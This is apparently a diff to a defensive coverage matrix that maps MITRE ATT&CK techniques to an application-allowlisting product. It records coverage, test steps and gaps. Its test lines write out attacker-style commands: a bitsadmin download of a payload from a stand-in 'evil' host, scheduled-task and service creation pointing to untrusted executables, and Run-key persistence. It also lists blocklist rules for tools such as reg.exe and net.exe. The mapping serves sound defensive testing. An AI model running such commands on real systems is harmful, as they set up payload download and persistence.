@@ -4,9 +4,9 @@
 
 **Total techniques:** 472
 
-**Covered (Yes):** 215 (45%)
+**Covered (Yes):** 209 (44%)
 
-**Not Covered (No):** 257 (54%)
+**Not Covered (No):** 263 (55%)
 
 ## Scoring
 
@@ -28,13 +28,13 @@
 | Tactic | Yes | No | Total |
 |--------|----:|---:|------:|
 | initial-access | 6 | 15 | 21 |
-| execution | 24 | 3 | 27 |
+| execution | 23 | 4 | 27 |
 | persistence | 67 | 24 | 91 |
-| privilege-escalation | 48 | 27 | 75 |
-| defense-evasion | 78 | 87 | 165 |
-| credential-access | 14 | 39 | 53 |
+| privilege-escalation | 47 | 28 | 75 |
+| defense-evasion | 77 | 88 | 165 |
+| credential-access | 13 | 40 | 53 |
 | discovery | 21 | 21 | 42 |
-| lateral-movement | 12 | 5 | 17 |
+| lateral-movement | 10 | 7 | 17 |
 | collection | 4 | 28 | 32 |
 | command-and-control | 6 | 39 | 45 |
 | exfiltration | 0 | 17 | 17 |
@@ -44,6 +44,28 @@
 
 
 ## INITIAL-ACCESS (21 techniques - 6 covered)
+
+### T1078 - Valid Accounts
+**No** ⚪ | none
+
+Valid accounts. Using legitimate credentials. Identity plane. No file execution.
+
+**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.
+
+### T1078.001 - Default Accounts
+**No** ⚪ | none
+
+Default accounts. Identity.
+
+### T1078.002 - Domain Accounts
+**No** ⚪ | none
+
+Domain accounts. Identity.
+
+### T1078.003 - Local Accounts
+**No** ⚪ | none
+
+Local accounts. Identity.
 
 ### T1091 - Replication Through Removable Media
 **Yes** 🟢 | default-deny + script-control | Testable: yes
@@ -172,6 +194,13 @@ Spearphishing voice (vishing). Social engineering via phone. No file execution i
 
 **Limitations:** If vishing leads to user running something, that execution is checked.
 
+### T1659 - Content Injection
+**No** ⚪ | none
+
+Content injection. Injecting content into network traffic. Network-level.
+
+**Limitations:** If injected content leads to file download+execution, execution blocked.
+
 ### T1669 - Wi-Fi Networks
 **No** ⚪ | none
 
@@ -180,7 +209,7 @@ Wi-Fi networks. Rogue Wi-Fi. Network-level. No file execution.
 **Limitations:** Network security.
 
 
-## EXECUTION (27 techniques - 24 covered)
+## EXECUTION (27 techniques - 23 covered)
 
 ### T1047 - Windows Management Instrumentation
 **Yes** 🟢 | default-deny + blocklist | Testable: yes
@@ -318,13 +347,11 @@ Airlock allowlists DLLs by default. Every DLL load SHA-256 hashed and checked. P
 **Limitations:** Reflective DLL injection (memory-only, never a file) not caught.
 
 ### T1203 - Exploitation for Client Execution
-**Yes** 🟢 | default-deny + DLL-control | Testable: partial
+**No** ⚪ | default-deny + DLL-control | Testable: partial
 
-Client-side exploits execute inside trusted processes. Airlock doesn't prevent the exploit itself. But post-exploitation: any payload dropped to disk (exe/DLL/script) must be trusted. Attacker's dropped tools blocked.
+Exploitation for client execution is about abusing a vulnerability in a trusted application. The exploit runs inside the trusted process. Airlock doesn't detect or prevent the exploit itself. Post-exploitation payload execution is covered under the relevant execution techniques.
 
-**Test:** Trusted app exploited -> exploit drops C:\Temp\payload.exe -> payload blocked. Exploit drops DLL for sideload -> DLL blocked.
-
-**Limitations:** Pure in-memory exploitation (ROP chains, shellcode executing entirely in-process) not caught. That's EDR + exploit protection territory.
+**Limitations:** Exploit prevention, patching, and EDR behavioral detection are the controls.
 
 ### T1204 - User Execution
 **Yes** 🟢 | default-deny + script-control + DLL-control | Testable: yes
@@ -455,6 +482,55 @@ Network logon script. Same principle as T1037.001 but via network logon.
 
 **Limitations:** Same path trust caveats.
 
+### T1053 - Scheduled Task/Job
+**Yes** 🟢 | default-deny | Testable: yes
+
+Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted.
+
+**Test:** schtasks /create /tn test /tr C:\Temp\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked.
+
+**Limitations:** Task creation succeeds. Trusted-signed payloads run.
+
+### T1053.002 - At
+**Yes** 🟢 | default-deny + blocklist | Testable: yes
+
+at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time.
+
+**Test:** at 12:00 C:\Temp\malware.exe -> job creates, exe blocked at scheduled time.
+
+**Limitations:** Job creation not prevented.
+
+### T1053.005 - Scheduled Task
+**Yes** 🟢 | default-deny + blocklist | Testable: yes
+
+Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules.
+
+**Test:** schtasks /create /tn evil /tr C:\Temp\payload.exe -> OK. On fire, payload blocked.
+
+**Limitations:** Task creation not prevented. PS one-liners via -Command not caught if PS trusted.
+
+### T1078 - Valid Accounts
+**No** ⚪ | none
+
+Valid accounts. Using legitimate credentials. Identity plane. No file execution.
+
+**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.
+
+### T1078.001 - Default Accounts
+**No** ⚪ | none
+
+Default accounts. Identity.
+
+### T1078.002 - Domain Accounts
+**No** ⚪ | none
+
+Domain accounts. Identity.
+
+### T1078.003 - Local Accounts
+**No** ⚪ | none
+
+Local accounts. Identity.
+
 ### T1098 - Account Manipulation
 **No** ⚪ | none
 
@@ -480,6 +556,24 @@ net.exe used for group manipulation. Restrictable via blocklist metarule for non
 **Test:** Metarule: original_filename 'net' AND user NOT admin -> blocks net group/localgroup manipulation.
 
 **Limitations:** PowerShell AD cmdlets still available if PS is trusted for the user.
+
+### T1112 - Modify Registry
+**Yes** 🟢 | blocklist-metarule | Testable: yes
+
+reg.exe and regedit.exe: restrict via blocklist metarule for non-admins. Many persistence techniques rely on registry modification - blocking reg.exe reduces attack surface.
+
+**Test:** Metarule: original_filename 'reg' AND user NOT admin -> blocks reg.exe. Metarule: original_filename 'regedit' AND user NOT admin -> blocks regedit.
+
+**Limitations:** PowerShell Set-ItemProperty still available if PS trusted. Registry APIs from trusted processes not caught.
+
+### T1133 - External Remote Services
+**No** ⚪ | none (post-access execution controlled) | Testable: partial
+
+External remote services (VPN/RDP/Citrix). Access mechanism. Post-access, Airlock enforces on any tools attacker tries to run.
+
+**Test:** RDP in, attempt unsigned tool -> blocked.
+
+**Limitations:** Access itself not prevented.
 
 ### T1136 - Create Account
 **Yes** 🟢 | blocklist-metarule | Testable: yes
@@ -594,6 +688,32 @@ IDE must be allowlisted. IDE extension DLLs/native modules must be trusted.
 
 **Limitations:** JS-based extensions run inside trusted IDE process - not separately controlled.
 
+### T1197 - BITS Jobs
+**Yes** 🟢 | default-deny + blocklist | Testable: yes
+
+BITS downloads files to disk. Downloaded file must be trusted to execute. bitsadmin.exe can be blocklisted to prevent BITS job creation.
+
+**Test:** bitsadmin /transfer job /download http://evil/payload.exe C:\Temp\p.exe -> downloads OK, execution blocked. Blocklist bitsadmin for non-admins.
+
+**Limitations:** Download itself not prevented - only execution of downloaded payload.
+
+### T1205 - Traffic Signaling
+**No** ⚪ | none
+
+Traffic signaling / port knocking. Network-level. No file execution.
+
+**Limitations:** Network security.
+
+### T1205.001 - Port Knocking
+**No** ⚪ | none
+
+Port knocking. Network-level.
+
+### T1205.002 - Socket Filters
+**No** ⚪ | none
+
+Socket filters. Kernel-level network manipulation.
+
 ### T1505 - Server Software Component
 **Yes** 🟢 | script-control + DLL-control | Testable: yes
 
@@ -643,6 +763,36 @@ IIS native modules (DLL). Must be trusted.
 Terminal services DLL. Must be trusted to load.
 
 **Test:** Untrusted terminal services DLL -> blocked.
+
+### T1542 - Pre-OS Boot
+**No** ⚪ | none
+
+Pre-OS boot. Firmware/bootkit operates below OS. Airlock kernel driver loads after OS boot.
+
+**Test:** N/A - below OS level.
+
+**Limitations:** Secure Boot is the control here.
+
+### T1542.001 - System Firmware
+**No** ⚪ | none
+
+System firmware. Below OS.
+
+**Limitations:** UEFI security.
+
+### T1542.002 - Component Firmware
+**No** ⚪ | none
+
+Component firmware. Below OS.
+
+**Limitations:** Hardware security.
+
+### T1542.003 - Bootkit
+**No** ⚪ | none
+
+Bootkit. Below OS level.
+
+**Limitations:** Secure Boot/ELAM territory.
 
 ### T1543 - Create or Modify System Process
 **Yes** 🟢 | default-deny | Testable: yes
@@ -845,9 +995,9 @@ Security Support Provider DLL. Loaded by lsass. Must be trusted.
 
 Attackers register a malicious driver or DLL to be loaded by the LSASS process at boot (e.g., SSP, authentication package). LSASS itself is not blocked - it's a critical Windows process. The untrusted driver/DLL that LSASS tries to load IS blocked by DLL control. Microsoft Recommended Driver Block Rules predefined blocklist covers known malicious drivers even if signed.
 
-**Test:** 1) Untrusted driver -> blocked at load. 2) Import MS Driver Block Rules -> known bad drivers blocked even if signed.
+**Test:** 1) Register untrusted DLL as authentication package via registry -> DLL blocked when LSASS loads it at boot. 2) Import MS Driver Block Rules -> known bad drivers blocked even if signed.
 
-**Limitations:** Drivers signed by trusted publishers load normally. Driver Block Rules predefined list covers known bad ones.
+**Limitations:** Legitimate signed drivers/DLLs from trusted publishers load normally. Registry modification to register the payload is not prevented.
 
 ### T1547.009 - Shortcut Modification
 **Yes** 🟢 | default-deny | Testable: yes
@@ -894,6 +1044,156 @@ Replacing a trusted binary with malicious version. If hash changes (it will), ne
 
 **Limitations:** If trusted by path rule (not hash), replacement at same path may run. Prefer hash/publisher trust over path rules.
 
+### T1556 - Modify Authentication Process
+**No** ⚪ | none (sub-technique dependent)
+
+Modify authentication process. Modifies login/auth mechanisms. Some sub-techniques involve DLL loading.
+
+**Test:** See sub-techniques.
+
+### T1556.001 - Domain Controller Authentication
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Domain controller auth DLL. Password filter loaded by lsass. Must be trusted.
+
+**Test:** Untrusted password filter DLL on DC -> blocked.
+
+**Limitations:** DC/server focused.
+
+### T1556.002 - Password Filter DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Password filter DLL. Loaded by lsass on password change. Must be trusted.
+
+**Test:** Untrusted password filter DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1556.005 - Reversible Encryption
+**No** ⚪ | none
+
+Reversible encryption. AD policy change. No file execution.
+
+**Limitations:** AD security.
+
+### T1556.006 - Multi-Factor Authentication
+**No** ⚪ | none
+
+MFA interception. Identity plane.
+
+**Limitations:** MFA security.
+
+### T1556.007 - Hybrid Identity
+**No** ⚪ | none
+
+Hybrid identity. Cloud/identity plane.
+
+### T1556.008 - Network Provider DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Network provider DLL. Loaded at logon. Must be trusted.
+
+**Test:** Untrusted network provider DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1574 - Hijack Execution Flow
+**Yes** 🟢 | DLL-control + default-deny | Testable: yes
+
+Hijack execution flow - DLL control is the primary defense. Untrusted DLLs blocked at load regardless of the hijack vector (search order, sideloading, COR_PROFILER, etc).
+
+**Test:** Place untrusted DLL in trusted app directory -> DLL blocked at load.
+
+**Limitations:** Memory-only hijacks (T1574.013 KernelCallbackTable) operate inside trusted process memory - not caught. Trusted-signed DLLs pass publisher trust.
+
+### T1574.001 - DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+DLL search order hijacking. Malicious DLL in app directory. Must be trusted.
+
+**Test:** Unsigned DLL with legitimate name in app dir -> blocked.
+
+**Limitations:** Strongest control against common malware technique.
+
+### T1574.005 - Executable Installer File Permissions Weakness
+**Yes** 🟢 | default-deny | Testable: partial
+
+Executable installer file perms weakness. Replacement must be trusted.
+
+**Test:** Replace installer exe with unsigned -> blocked on service restart.
+
+**Limitations:** File replacement itself is OS permissions issue.
+
+### T1574.007 - Path Interception by PATH Environment Variable
+**Yes** 🟢 | default-deny | Testable: yes
+
+Path interception by PATH env var. Malicious exe in high-priority PATH dir. Must be trusted.
+
+**Test:** Unsigned exe named common_tool.exe in PATH dir -> blocked.
+
+**Limitations:** If placed in path-trusted directory, may run.
+
+### T1574.008 - Path Interception by Search Order Hijacking
+**Yes** 🟢 | default-deny | Testable: yes
+
+Path interception by search order. Same principle as .007.
+
+**Test:** Unsigned exe in directory searched before legitimate -> blocked.
+
+**Limitations:** Path rule coverage important.
+
+### T1574.009 - Path Interception by Unquoted Path
+**Yes** 🟢 | default-deny | Testable: yes
+
+Unquoted path interception. Attacker places exe at shorter path. Must be trusted.
+
+**Test:** Unquoted 'C:\Program Files\App\svc.exe' -> place C:\Program.exe (unsigned) -> blocked.
+
+**Limitations:** Classic technique caught cleanly.
+
+### T1574.010 - Services File Permissions Weakness
+**Yes** 🟢 | default-deny | Testable: partial
+
+Services file perms weakness. Replace service binary. Must be trusted.
+
+**Test:** Replace service binary with unsigned -> restart blocked.
+
+**Limitations:** File replacement is OS perms issue.
+
+### T1574.011 - Services Registry Permissions Weakness
+**Yes** 🟢 | default-deny | Testable: yes
+
+Services registry perms weakness. Modify ImagePath to malicious exe. Must be trusted.
+
+**Test:** Modify service ImagePath to unsigned exe -> start blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1574.012 - COR_PROFILER
+**Yes** 🟢 | DLL-control | Testable: yes
+
+COR_PROFILER .NET profiler DLL. Must be trusted.
+
+**Test:** Set COR_PROFILER to untrusted DLL -> blocked when .NET app starts.
+
+**Limitations:** Env var mod not prevented.
+
+### T1574.013 - KernelCallbackTable
+**No** ⚪ | none
+
+KernelCallbackTable. In-memory manipulation of trusted process.
+
+**Test:** N/A - in-memory. EDR territory.
+
+### T1574.014 - AppDomainManager
+**Yes** 🟢 | DLL-control | Testable: yes
+
+AppDomainManager injection. .NET config loads attacker DLL. Must be trusted.
+
+**Test:** Malicious .config pointing to untrusted DLL -> blocked.
+
+**Limitations:** Config file modification not prevented.
+
 ### T1653 - Power Settings
 **No** ⚪ | none
 
@@ -907,16 +1207,597 @@ Power settings. Modifying power config to prevent sleep. No file execution.
 Exclusive control. Mutex/lock to prevent other instances. Behavioral, inside trusted process.
 
 
-## PRIVILEGE-ESCALATION (75 techniques - 48 covered)
+## PRIVILEGE-ESCALATION (75 techniques - 47 covered)
+
+### T1037 - Boot or Logon Initialization Scripts
+**Yes** 🟢 | script-control + default-deny | Testable: yes
+
+Boot/logon init scripts. Script content must be trusted via script control. Untrusted scripts blocked at logon.
+
+**Test:** Set GPO logon script to untrusted .bat -> blocked at logon.
+
+**Limitations:** Script path configuration not prevented.
+
+### T1037.001 - Logon Script (Windows)
+**Yes** 🟢 | script-control + default-deny | Testable: yes
+
+Logon scripts (Windows). Script file must be trusted. Scripts in NETLOGON share: if path-trusted, runs.
+
+**Test:** Place untrusted .bat in NETLOGON, assign via GPO -> blocked on target at logon.
+
+**Limitations:** Legitimate scripts in trusted paths run. Replacing trusted script at same path could work if path-trusted.
+
+### T1037.003 - Network Logon Script
+**Yes** 🟢 | script-control + default-deny | Testable: yes
+
+Network logon script. Same principle as T1037.001 but via network logon.
+
+**Test:** Untrusted network logon script -> blocked.
+
+**Limitations:** Same path trust caveats.
+
+### T1053 - Scheduled Task/Job
+**Yes** 🟢 | default-deny | Testable: yes
+
+Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted.
+
+**Test:** schtasks /create /tn test /tr C:\Temp\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked.
+
+**Limitations:** Task creation succeeds. Trusted-signed payloads run.
+
+### T1053.002 - At
+**Yes** 🟢 | default-deny + blocklist | Testable: yes
+
+at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time.
+
+**Test:** at 12:00 C:\Temp\malware.exe -> job creates, exe blocked at scheduled time.
+
+**Limitations:** Job creation not prevented.
+
+### T1053.005 - Scheduled Task
+**Yes** 🟢 | default-deny + blocklist | Testable: yes
+
+Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules.
+
+**Test:** schtasks /create /tn evil /tr C:\Temp\payload.exe -> OK. On fire, payload blocked.
+
+**Limitations:** Task creation not prevented. PS one-liners via -Command not caught if PS trusted.
+
+### T1055 - Process Injection
+**No** ⚪ | DLL-control (conditional) | Testable: partial
+
+Process injection (parent). Injecting code into trusted process memory. Airlock doesn't monitor memory operations. If injection requires loading a DLL from disk, DLL control catches it.
+
+**Test:** DLL injection where DLL is a file on disk -> DLL must be trusted. Memory-only injection -> not caught.
+
+**Limitations:** Primary gap. EDR territory for memory-based injection.
+
+### T1055.001 - Dynamic-link Library Injection
+**Yes** 🟢 | DLL-control | Testable: yes
+
+DLL injection via LoadLibrary - DLL file must exist on disk and be trusted. Airlock blocks untrusted DLL at load time.
+
+**Test:** CreateRemoteThread + LoadLibrary with untrusted DLL -> DLL blocked at load.
+
+**Limitations:** Reflective DLL injection (loaded entirely from memory, no file on disk) not caught - that's EDR territory.
+
+### T1055.002 - Portable Executable Injection
+**No** ⚪ | none
+
+PE injection. Writing PE directly into process memory. No file on disk.
+
+**Test:** N/A - memory-only.
+
+**Limitations:** EDR territory.
+
+### T1055.003 - Thread Execution Hijacking
+**No** ⚪ | none
+
+Thread execution hijacking. Modifying existing thread in trusted process. Memory-level.
+
+### T1055.004 - Asynchronous Procedure Call
+**No** ⚪ | none
+
+Asynchronous procedure call (APC) injection. Memory-level.
+
+### T1055.005 - Thread Local Storage
+**No** ⚪ | none
+
+Thread local storage injection. Memory-level.
+
+### T1055.011 - Extra Window Memory Injection
+**No** ⚪ | none
+
+Extra window memory injection. Memory-level.
+
+### T1055.012 - Process Hollowing
+**No** ⚪ | DLL-control (conditional) | Testable: partial
+
+Process hollowing creates a suspended process with a trusted binary, then replaces its image in memory. The memory replacement is invisible to Airlock. The initial process uses a trusted binary so Airlock allows it.
+
+**Test:** N/A - memory manipulation of trusted process.
+
+**Limitations:** If hollowing stages payload as file on disk first, that file is checked. Pure memory hollowing not caught. EDR territory.
+
+### T1055.013 - Process Doppelgänging
+**No** ⚪ | default-deny (potentially) | Testable: partial
+
+Process doppelganging uses NTFS transactions to create a file, load it into memory, then roll back the transaction. The file never persists on disk. Airlock's kernel driver may or may not intercept the transacted file load - needs lab validation.
+
+**Test:** Needs lab testing to confirm whether Airlock's kernel driver intercepts file loads during NTFS transactions.
+
+**Limitations:** Uncertain coverage. Treat as not covered until validated.
+
+### T1055.015 - ListPlanting
+**No** ⚪ | none
+
+ListPlanting. Message-based code execution in trusted process. Memory-level.
 
 ### T1068 - Exploitation for Privilege Escalation
+**No** ⚪ | none
+
+Exploitation for privilege escalation is about abusing a vulnerability in software or the kernel to gain elevated privileges. The exploit runs inside a trusted process or at kernel level. Airlock doesn't detect or prevent exploits. Post-exploitation payload deployment is covered under execution techniques.
+
+**Limitations:** Exploit prevention (Windows Exploit Guard), patching, least privilege, and EDR behavioral detection are the controls.
+
+### T1078 - Valid Accounts
+**No** ⚪ | none
+
+Valid accounts. Using legitimate credentials. Identity plane. No file execution.
+
+**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.
+
+### T1078.001 - Default Accounts
+**No** ⚪ | none
+
+Default accounts. Identity.
+
+### T1078.002 - Domain Accounts
+**No** ⚪ | none
+
+Domain accounts. Identity.
+
+### T1078.003 - Local Accounts
+**No** ⚪ | none
+
+Local accounts. Identity.
+
+### T1098 - Account Manipulation
+**No** ⚪ | none
+
+Account manipulation. Identity-plane operation. No file execution.
+
+**Limitations:** Identity/directory security.
+
+### T1098.002 - Additional Email Delegate Permissions
+**No** ⚪ | none
+
+Additional email delegate permissions. No file execution.
+
+### T1098.005 - Device Registration
+**No** ⚪ | none
+
+Device registration. MDM/identity plane.
+
+### T1098.007 - Additional Local or Domain Groups
+**Yes** 🟢 | blocklist-metarule | Testable: yes
+
+net.exe used for group manipulation. Restrictable via blocklist metarule for non-admins.
+
+**Test:** Metarule: original_filename 'net' AND user NOT admin -> blocks net group/localgroup manipulation.
+
+**Limitations:** PowerShell AD cmdlets still available if PS is trusted for the user.
+
+### T1134 - Access Token Manipulation
+**No** ⚪ | none
+
+Access token manipulation. API-level operations inside trusted process. No file execution.
+
+**Limitations:** If tool for token manipulation is untrusted, tool itself blocked.
+
+### T1134.001 - Token Impersonation/Theft
+**No** ⚪ | none
+
+Token impersonation/theft. API-level.
+
+### T1134.002 - Create Process with Token
+**No** ⚪ | default-deny | Testable: partial
+
+Process created with stolen token - the process binary must be trusted, but token manipulation itself is API-level and not caught.
+
+**Limitations:** Token manipulation is identity/API level. EDR territory.
+
+### T1134.003 - Make and Impersonate Token
+**No** ⚪ | none
+
+Make and impersonate token. API-level.
+
+### T1134.004 - Parent PID Spoofing
+**No** ⚪ | default-deny | Testable: partial
+
+Parent PID spoofing is API-level process creation. Binary must be trusted but spoofing is not detected.
+
+**Limitations:** May affect Airlock process trust rules that key on parent process. Test.
+
+### T1134.005 - SID-History Injection
+**No** ⚪ | none
+
+SID-History injection. Identity/AD manipulation.
+
+### T1484 - Domain or Tenant Policy Modification
+**No** ⚪ | none
+
+Domain/tenant policy modification. AD/cloud policy changes. No file execution.
+
+**Limitations:** AD security.
+
+### T1484.001 - Group Policy Modification
+**No** ⚪ | none
+
+Group policy modification. AD operation.
+
+**Limitations:** If modified GPO delivers untrusted software, execution blocked on endpoints.
+
+### T1484.002 - Trust Modification
+**No** ⚪ | none
+
+Trust modification. AD trust changes.
+
+### T1543 - Create or Modify System Process
+**Yes** 🟢 | default-deny | Testable: yes
+
+Service creation succeeds (sc create not prevented). Service binary blocked at start if untrusted. sc.exe can be blocklisted for non-admins.
+
+**Test:** sc create evilsvc binPath= C:\Temp\evil.exe -> creation OK. sc start evilsvc -> binary blocked.
+
+**Limitations:** Service registration not prevented. Airlock controls the execution of the service binary, not the service configuration.
+
+### T1543.003 - Windows Service
+**Yes** 🟢 | default-deny + DLL-control + blocklist | Testable: yes
+
+Windows Service. Binary/DLL must be trusted. Service DLLs via svchost blocked. sc.exe blocklist-controllable.
+
+**Test:** 1) sc create unsigned exe -> start blocked. 2) Malicious svchost service DLL -> blocked. 3) Blocklist sc.exe for non-admins.
+
+**Limitations:** Service creation not prevented.
+
+### T1546 - Event Triggered Execution
+**Yes** 🟢 | default-deny + script-control + DLL-control | Testable: yes
+
+Event triggered execution (parent). Code launched by event triggers must be trusted.
+
+**Test:** Varies by sub-technique. Trigger registers OK, payload blocked.
+
+### T1546.001 - Change Default File Association
+**Yes** 🟢 | default-deny | Testable: yes
+
+Change default file association. Handler exe must be trusted.
+
+**Test:** assoc .txt to evil handler exe -> exe blocked when .txt opened.
+
+**Limitations:** Reg mod not prevented.
+
+### T1546.002 - Screensaver
+**Yes** 🟢 | default-deny | Testable: yes
+
+Screensaver .scr (PE executable). Must be trusted.
+
+**Test:** Set screensaver to untrusted .scr -> blocked on activation.
+
+**Limitations:** .scr files are PE executables, full allowlist enforcement.
+
+### T1546.003 - Windows Management Instrumentation Event Subscription
+**Yes** 🟢 | default-deny + script-control | Testable: yes
+
+WMI event subscription. Payload launched by wmiprvse must be trusted. Script payloads via script control.
+
+**Test:** WMI event sub launching unsigned exe -> blocked when event fires.
+
+**Limitations:** Subscription creation not prevented.
+
+### T1546.007 - Netsh Helper DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Netsh helper DLL. Must be trusted to load.
+
+**Test:** netsh add helper unsigned.dll -> blocked at load.
+
+**Limitations:** netsh.exe trusted; DLL registration succeeds, load blocked.
+
+### T1546.008 - Accessibility Features
+**Yes** 🟢 | default-deny | Testable: yes
+
+Accessibility features (sethc.exe, utilman.exe). Replacement binary must be trusted by hash. Blocklist metarule on original_filename catches renamed trusted tools (e.g., cmd.exe renamed to sethc.exe).
+
+**Test:** Replace sethc.exe with untrusted binary -> blocked at lock screen activation. Blocklist original_filename 'cmd' -> catches cmd.exe renamed to sethc.exe.
+
+**Limitations:** If attacker copies a trusted binary with matching hash, it runs. Original filename metarule is the defense against renamed trusted tools.
+
+### T1546.009 - AppCert DLLs
+**Yes** 🟢 | DLL-control | Testable: yes
+
+AppCert DLLs. Loaded into every CreateProcess caller. Must be trusted.
+
+**Test:** Register untrusted AppCert DLL -> blocked at load.
+
+**Limitations:** Reg mod not prevented.
+
+### T1546.010 - AppInit DLLs
+**Yes** 🟢 | DLL-control | Testable: yes
+
+AppInit DLLs. Loaded into user-mode processes. Must be trusted.
+
+**Test:** Register untrusted AppInit DLL -> blocked.
+
+**Limitations:** Disabled by default with Secure Boot.
+
+### T1546.011 - Application Shimming
+**Yes** 🟢 | DLL-control + blocklist | Testable: yes
+
+Application shimming. sdbinst.exe can be blocklisted. Shim-loaded DLLs must be trusted.
+
+**Test:** 1) Blocklist sdbinst.exe. 2) Shim loading untrusted DLL -> blocked.
+
+**Limitations:** If shim redirects to trusted binary, not inspected.
+
+### T1546.012 - Image File Execution Options Injection
+**Yes** 🟢 | default-deny | Testable: yes
+
+IFEO debugger. Debugger binary must be trusted.
+
+**Test:** IFEO debugger set to unsigned exe -> blocked when target launched.
+
+**Limitations:** Reg mod not prevented. Trusted debugger (cmd.exe) runs.
+
+### T1546.013 - PowerShell Profile
+**Yes** 🟢 | script-control | Testable: yes
+
+PowerShell profile. profile.ps1 must be trusted via script control.
+
+**Test:** Drop malicious profile.ps1 -> blocked at PS startup if untrusted.
+
+**Limitations:** If profile is path-trusted, runs. Audit path rules.
+
+### T1546.015 - Component Object Model Hijacking
+**Yes** 🟢 | DLL-control | Testable: yes
+
+COM hijacking. Malicious DLL registered as COM object. Must be trusted.
+
+**Test:** Untrusted DLL as COM object -> blocked when instantiated.
+
+**Limitations:** Reg mod not prevented.
+
+### T1546.016 - Installer Packages
+**Yes** 🟢 | script-control | Testable: yes
+
+Installer packages (MSI). Blocked via script control (MSI is covered type).
+
+**Test:** Drop untrusted .msi -> blocked.
+
+**Limitations:** Trusted-signed MSIs from trusted publishers install normally.
+
+### T1546.018 - Python Startup Hooks
+**Yes** 🟢 | script-control + default-deny | Testable: yes
+
+Python startup hooks. Python interpreter must be allowlisted. Startup hook .py must be trusted via script control.
+
+**Test:** 1) python.exe not allowlisted -> blocked. 2) Untrusted startup .py -> blocked.
+
+**Limitations:** If python trusted and hook in trusted path, runs.
+
+### T1547 - Boot or Logon Autostart Execution
+**Yes** 🟢 | default-deny + DLL-control | Testable: yes
+
+Autostart registration (reg keys, startup folder) not prevented. Payload blocked at boot/logon when execution is attempted.
+
+**Test:** reg add HKCU\...\Run /v evil /d C:\Temp\mal.exe -> registration succeeds, mal.exe blocked at logon.
+
+**Limitations:** Registration mechanism not prevented. Airlock controls the execution of the payload, not the persistence setup.
+
+### T1547.001 - Registry Run Keys / Startup Folder
+**Yes** 🟢 | default-deny | Testable: yes
+
+Registry Run keys / Startup folder. Target exe must be trusted.
+
+**Test:** 1) Run key to unsigned exe -> blocked at logon. 2) Startup folder shortcut to unsigned exe -> blocked.
+
+**Limitations:** Reg/folder modification not prevented.
+
+### T1547.002 - Authentication Package
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Authentication package DLL. Loaded by lsass. Must be trusted.
+
+**Test:** Register untrusted auth package DLL -> blocked at load.
+
+**Limitations:** Reg mod not prevented.
+
+### T1547.003 - Time Providers
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Time providers DLL. Loaded by w32time. Must be trusted.
+
+**Test:** Register untrusted time provider DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1547.004 - Winlogon Helper DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Winlogon helper DLL. Loaded at logon. Must be trusted.
+
+**Test:** Untrusted Winlogon helper DLL -> blocked at logon.
+
+**Limitations:** Reg mod not prevented.
+
+### T1547.005 - Security Support Provider
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Security Support Provider DLL. Loaded by lsass. Must be trusted.
+
+**Test:** Untrusted SSP DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1547.008 - LSASS Driver
+**Yes** 🟢 | default-deny + blocklist (predefined) | Testable: yes
+
+Attackers register a malicious driver or DLL to be loaded by the LSASS process at boot (e.g., SSP, authentication package). LSASS itself is not blocked - it's a critical Windows process. The untrusted driver/DLL that LSASS tries to load IS blocked by DLL control. Microsoft Recommended Driver Block Rules predefined blocklist covers known malicious drivers even if signed.
+
+**Test:** 1) Register untrusted DLL as authentication package via registry -> DLL blocked when LSASS loads it at boot. 2) Import MS Driver Block Rules -> known bad drivers blocked even if signed.
+
+**Limitations:** Legitimate signed drivers/DLLs from trusted publishers load normally. Registry modification to register the payload is not prevented.
+
+### T1547.009 - Shortcut Modification
+**Yes** 🟢 | default-deny | Testable: yes
+
+Shortcut modification. Target exe must be trusted.
+
+**Test:** Modified shortcut to unsigned exe -> blocked when used.
+
+**Limitations:** Shortcut modification not prevented.
+
+### T1547.010 - Port Monitors
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Port monitors DLL. Loaded by spoolsv.exe. Must be trusted.
+
+**Test:** Untrusted port monitor DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1547.012 - Print Processors
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Print processors DLL. Loaded by spoolsv.exe. Must be trusted.
+
+**Test:** Untrusted print processor DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1547.014 - Active Setup
+**Yes** 🟢 | default-deny | Testable: yes
+
+Active Setup. StubPath exe must be trusted.
+
+**Test:** Active Setup StubPath to unsigned exe -> blocked at logon.
+
+**Limitations:** Reg mod not prevented.
+
+### T1548 - Abuse Elevation Control Mechanism
 **Yes** 🟢 | default-deny | Testable: partial
 
-Exploitation for privilege escalation. Exploit runs inside trusted process. If exploit drops payload, blocked. If exploit is a standalone tool, must be trusted.
+UAC bypass techniques often involve DLL hijacking in auto-elevate apps or registry modification pointing to untrusted payload. DLL control blocks hijacked DLLs. Untrusted payloads from registry-based bypasses blocked.
 
-**Test:** Attacker drops exploit.exe -> blocked. Exploit inside trusted process dropping payload -> payload blocked.
